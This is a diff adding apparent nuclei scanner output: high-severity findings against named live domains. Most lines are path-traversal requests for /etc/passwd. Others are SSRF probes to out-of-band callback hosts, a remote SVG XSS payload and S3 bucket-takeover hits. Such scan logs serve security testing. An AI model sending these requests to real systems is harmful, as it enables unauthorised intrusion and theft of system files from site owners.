@@ -1,0 +1,20 @@
+[CVE-2010-4231] [http] [high] https://maria.sumplus.xyz/../../../../../../../../../../../../../etc/passwd
+[CVE-2015-8813] [http] [high] https://proxy.ferra.ag/Umbraco/feedproxy.aspx?url=http://dbtdnjat7v5jgee27k0gwtiwbwurjoybd.oast.online
+[CVE-2017-18638] [http] [high] https://proxy.ferra.ag/composer/send_email?to=IahV@gnHj&url=http://dbtdnjat7v5jgee27k0gn1x5hurwfr4py.oast.online
+[CVE-2018-10956] [http] [high] https://maria.sumplus.xyz/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
+[CVE-2018-7490] [http] [high] https://maria.sumplus.xyz/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+[CVE-2019-18922] [http] [high] https://maria.sumplus.xyz/../../../../../../etc/passwd
+[CVE-2019-7315] [http] [high] https://maria.sumplus.xyz/../../../../../etc/passwd
+[CVE-2020-12447] [http] [high] https://maria.sumplus.xyz/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+[CVE-2021-40978] [http] [high] https://maria.sumplus.xyz/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[CVE-2022-38794] [http] [high] https://maria.sumplus.xyz/../../../../../../../../etc/passwd
+[CVE-2022-41412] [http] [high] https://proxy.ferra.ag/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://oast.fun/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4
+[aws-bucket-takeover] [http] [high] https://btc.fluidtokens.com ["btc.fluidtokens.com"]
+[aws-bucket-takeover] [http] [high] https://s3.vestige.fi ["s3.vestige.fi"]
+[bullwark-momentum-lfi] [http] [high] https://maria.sumplus.xyz/../../../../../../../../../../../../../etc/passwd
+[generic-linux-lfi] [http] [high] https://maria.sumplus.xyz/./../../../../../../../../../../etc/passwd [paths="/./../../../../../../../../../../etc/passwd"]
+[gsoap-lfi] [http] [high] https://maria.sumplus.xyz/../../../../../../../../../etc/passwd
+[ibm-infoprint-lfi] [http] [high] https://maria.sumplus.xyz/./../../../../../../../../../../etc/passwd
+[nginx-merge-slashes-path-traversal] [http] [high] https://maria.sumplus.xyz///////../../../etc/passwd
+[retool-svg-xss] [http] [high] https://proxy.ferra.ag/api/imageProxy?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
+[splash-render-ssrf] [http] [high] https://proxy.ferra.ag/render.html?url=https://oast.live
